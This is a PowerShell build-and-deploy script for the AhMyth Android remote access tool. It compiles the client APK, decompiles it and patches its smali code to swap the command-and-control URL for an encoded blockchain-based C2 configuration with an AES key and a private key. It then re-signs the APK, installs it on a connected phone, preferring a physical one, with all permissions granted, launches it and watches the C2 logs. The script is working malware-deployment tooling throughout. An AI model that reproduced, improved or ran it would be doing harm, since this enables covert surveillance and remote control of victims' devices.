# Build, setup blockchain C2, install, and run AhMyth client
# This script builds from source, injects blockchain config, installs, and monitors logs

param(
    [switch]$Debug
)

$ErrorActionPreference = "Stop"
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$clientDir = Join-Path $scriptDir "AhMyth-Client"
$factoryDir = Join-Path $scriptDir "AhMyth-Server" "app" "Factory"
$ahmythDir = Join-Path $factoryDir "Ahmyth"

Write-Host "=== AhMyth Blockchain C2 Build & Run ===" -ForegroundColor Cyan

# Check for blockchain environment variables
$rpcUrl = $env:BLOCKCHAIN_RPC_URL
$contractAddress = $env:BLOCKCHAIN_CONTRACT_ADDRESS
$aesKey = $env:BLOCKCHAIN_C2_AES_KEY
$clientPrivateKey = $env:BLOCKCHAIN_CLIENT_PRIVATE_KEY

if (-not $rpcUrl) {
    $rpcUrl = "https://ethereum-sepolia-rpc.publicnode.com"
    Write-Host "Using default RPC: $rpcUrl" -ForegroundColor Yellow
}

if (-not $contractAddress) {
    # Try to read from saved file
    $contractFile = Join-Path $scriptDir ".blockchain-contract.env"
    if (Test-Path $contractFile) {
        $content = Get-Content $contractFile -Raw
        if ($content -match "BLOCKCHAIN_CONTRACT_ADDRESS=(0x[a-fA-F0-9]+)") {
            $contractAddress = $matches[1]
            Write-Host "Found saved contract: $contractAddress" -ForegroundColor Green
        }
    }
    if (-not $contractAddress) {
        Write-Host "ERROR: BLOCKCHAIN_CONTRACT_ADDRESS not set!" -ForegroundColor Red
        Write-Host "Set it with: `$env:BLOCKCHAIN_CONTRACT_ADDRESS='0x...'" -ForegroundColor Yellow
        exit 1
    }
}

if (-not $aesKey) {
    Write-Host "ERROR: BLOCKCHAIN_C2_AES_KEY not set!" -ForegroundColor Red
    Write-Host "Set it with: `$env:BLOCKCHAIN_C2_AES_KEY='64-char-hex-string'" -ForegroundColor Yellow
    exit 1
}

Write-Host "`nConfiguration:" -ForegroundColor Cyan
Write-Host "  RPC URL: $rpcUrl" -ForegroundColor White
Write-Host "  Contract: $contractAddress" -ForegroundColor White
Write-Host "  AES Key: $($aesKey.Substring(0,8))..." -ForegroundColor White
if ($clientPrivateKey) {
    Write-Host "  Client Private Key: Set (bidirectional mode)" -ForegroundColor Green
} else {
    Write-Host "  Client Private Key: Not set (one-way mode)" -ForegroundColor Yellow
}

# Step 1: Build client APK
Write-Host "`n[1/6] Building client APK..." -ForegroundColor Yellow
Push-Location $clientDir
try {
    $buildType = if ($Debug) { "assembleDebug" } else { "assembleDebug" }
    $apkPath = "app\build\outputs\apk\debug\app-debug.apk"
    
    $result = cmd /c ".\gradlew.bat $buildType --warning-mode=none 2>&1"
    if ($LASTEXITCODE -ne 0) {
        Write-Host "Build failed!" -ForegroundColor Red
        Write-Host $result
        exit 1
    }
    Write-Host "Build successful!" -ForegroundColor Green
    
    $fullApkPath = Join-Path $clientDir $apkPath
    if (-not (Test-Path $fullApkPath)) {
        Write-Host "Error: APK not found at $fullApkPath" -ForegroundColor Red
        exit 1
    }
    
    # Copy to Factory folder
    Copy-Item $fullApkPath (Join-Path $factoryDir "Ahmyth.apk") -Force
    Write-Host "APK copied to Factory folder" -ForegroundColor Green
} finally {
    Pop-Location
}

# Step 2: Decompile APK
Write-Host "`n[2/6] Decompiling APK..." -ForegroundColor Yellow
Push-Location $factoryDir
try {
    $apktoolJar = Join-Path $factoryDir "apktool.jar"
    
    if (-not (Test-Path $apktoolJar)) {
        Write-Host "Error: apktool.jar not found" -ForegroundColor Red
        exit 1
    }
    
    # Remove old decompiled folder
    if (Test-Path $ahmythDir) {
        Write-Host "Removing old Ahmyth folder..."
        Remove-Item -Recurse -Force $ahmythDir
    }
    
    # Decompile
    $result = java -jar $apktoolJar d (Join-Path $factoryDir "Ahmyth.apk") -o Ahmyth -f 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "Decompilation failed!" -ForegroundColor Red
        Write-Host $result
        exit 1
    }
    Write-Host "Decompilation successful!" -ForegroundColor Green
} finally {
    Pop-Location
}

# Step 3: Inject blockchain config
Write-Host "`n[3/6] Injecting blockchain C2 configuration..." -ForegroundColor Yellow
Push-Location $factoryDir
try {
    $possiblePaths = @(
        (Join-Path $ahmythDir "smali_classes3" "ahmyth" "mine" "king" "ahmyth" "IOSocket.smali"),
        (Join-Path $ahmythDir "smali" "ahmyth" "mine" "king" "ahmyth" "IOSocket.smali"),
        (Join-Path $ahmythDir "smali_classes2" "ahmyth" "mine" "king" "ahmyth" "IOSocket.smali")
    )
    
    $ioSocketPath = $null
    foreach ($path in $possiblePaths) {
        if (Test-Path $path) {
            $ioSocketPath = $path
            Write-Host "Found IOSocket at: $path" -ForegroundColor Green
            break
        }
    }
    
    if (-not $ioSocketPath) {
        Write-Host "Error: IOSocket.smali not found!" -ForegroundColor Red
        exit 1
    }
    
    # Create blockchain config JSON
    $configJson = @{
        type = "blockchain"
        rpcUrl = $rpcUrl
        contractAddress = $contractAddress
        aesKey = $aesKey
    }
    if ($clientPrivateKey) {
        $configJson.clientPrivateKey = $clientPrivateKey
    }
    
    $configJsonString = ($configJson | ConvertTo-Json -Compress)
    $base64Config = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($configJsonString))
    $blockchainMarker = "BLOCKCHAIN_C2_CONFIG:$base64Config"
    
    # Read and replace
    $content = Get-Content $ioSocketPath -Raw
    
    # In smali, the URL is stored in register v2: const-string v2, "http://192.168.0.177:1234"
    # This gets moved to v10 which becomes urlTemplate
    # We need to replace v2's value with the blockchain config
    $blockchainConstString = 'const-string v1, "' + $blockchainMarker + '"'
    
    # Replace the URL in v2 (this is what gets assigned to urlTemplate)
    if ($content -match 'const-string\s+v2,\s*"http://[^"]+"') {
        $content = $content -replace 'const-string\s+v2,\s*"http://[^"]+"', $blockchainConstString
        Write-Host "Injected blockchain config (replaced v2 URL string)" -ForegroundColor Green
    } elseif ($content -match 'const-string\s+v2,\s*"BLOCKCHAIN_C2_CONFIG:') {
        # Update existing blockchain config in v2
        $content = $content -replace 'const-string\s+v2,\s*"BLOCKCHAIN_C2_CONFIG:[^"]+"', $blockchainConstString
        Write-Host "Updated existing blockchain config in v2" -ForegroundColor Green
    } else {
        Write-Host "WARNING: Could not find v2 URL pattern!" -ForegroundColor Yellow
        Write-Host "Trying fallback: replacing any const-string with http://..." -ForegroundColor Yellow
        $content = $content -replace 'const-string\s+v\d+,\s*"http://[^"]+"', $blockchainConstString
    }
    
    Set-Content $ioSocketPath -Value $content -NoNewline
    Write-Host "Blockchain C2 configuration injected!" -ForegroundColor Green
} finally {
    Pop-Location
}

# Step 4: Rebuild and sign APK
Write-Host "`n[4/6] Rebuilding and signing APK..." -ForegroundColor Yellow
Push-Location $factoryDir
try {
    # Build
    $buildCmd = "java -jar apktool.jar b Ahmyth -o Ahmyth-rebuilt.apk"
    $result = cmd /c "$buildCmd 2>&1"
    if ($LASTEXITCODE -ne 0) {
        Write-Host "Build failed!" -ForegroundColor Red
        Write-Host $result
        exit 1
    }
    Write-Host "APK rebuilt!" -ForegroundColor Green
    
    # Sign
    $signJar = Join-Path $factoryDir "sign.jar"
    $signCmd = "java -jar sign.jar -a Ahmyth-rebuilt.apk"
    $result = cmd /c "$signCmd 2>&1"
    if ($LASTEXITCODE -ne 0) {
        Write-Host "Signing failed!" -ForegroundColor Red
        Write-Host $result
        exit 1
    }
    
    $signedApk = Join-Path $factoryDir "Ahmyth-rebuilt-aligned-debugSigned.apk"
    if (Test-Path $signedApk) {
        Write-Host "APK signed: $signedApk" -ForegroundColor Green
    } else {
        Write-Host "Error: Signed APK not found!" -ForegroundColor Red
        exit 1
    }
} finally {
    Pop-Location
}

# Step 5: Install on device
Write-Host "`n[5/6] Installing APK on device..." -ForegroundColor Yellow
$deviceOutput = & adb devices 2>&1 | Out-String
$devices = @()
$deviceOutput -split "`n" | ForEach-Object {
    $line = $_.Trim()
    if ($line -match "^([^\s]+)\s+device\s*$") {
        $devices += $matches[1]
    }
}
if (-not $devices -or $devices.Count -eq 0) {
    Write-Host "ERROR: No devices connected!" -ForegroundColor Red
    Write-Host "Device output: $deviceOutput" -ForegroundColor Yellow
    exit 1
}
# Prefer ANDROID_SERIAL if provided and connected
if ($env:ANDROID_SERIAL -and $devices -contains $env:ANDROID_SERIAL) {
    $device = $env:ANDROID_SERIAL
    Write-Host "Using device from ANDROID_SERIAL: $device" -ForegroundColor Green
} else {
    # Prefer physical over emulator
    $physical = $devices | Where-Object { $_ -notlike "emulator*" } | Select-Object -First 1
    if ($physical) {
        $device = $physical
    } else {
        $device = $devices[0]
    }
    Write-Host "Using device: $device" -ForegroundColor Green
}

# Uninstall old version
& adb -s $device uninstall ahmyth.mine.king.ahmyth 2>&1 | Out-Null

# Install
& adb -s $device install -r -t -g $signedApk
if ($LASTEXITCODE -ne 0) {
    Write-Host "Installation failed!" -ForegroundColor Red
    exit 1
}
Write-Host "Installation successful!" -ForegroundColor Green

# Step 6: Start app and monitor logs
Write-Host "`n[6/6] Starting app and monitoring logs..." -ForegroundColor Yellow
& adb -s $device logcat -c | Out-Null

# Try to start the app (explicit MainActivity to ensure launch)
Write-Host "Attempting to start app..." -ForegroundColor Yellow
& adb -s $device shell am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -n ahmyth.mine.king.ahmyth/.MainActivity 2>&1 | Out-Null

Start-Sleep -Seconds 3

Write-Host "`n=== Monitoring Blockchain C2 Logs ===" -ForegroundColor Cyan
Write-Host "Press Ctrl+C to stop monitoring" -ForegroundColor Yellow
Write-Host ""

# Monitor logs for blockchain activity
if ($env:SKIP_LOG_STREAM -eq "1") {
    Write-Host "Dumping a single snapshot of recent logs (SKIP_LOG_STREAM=1)..." -ForegroundColor Yellow
    & adb -s $device logcat -d -v time -s AhMythApp:D MainService:D BlockchainC2:D IOSocket:D BlockchainEventPoller:D ConnectionManager:D
    Write-Host "`nLog snapshot complete." -ForegroundColor Green
} else {
    & adb -s $device logcat -v time -s AhMythApp:D MainService:D BlockchainC2:D IOSocket:D BlockchainEventPoller:D ConnectionManager:D
}

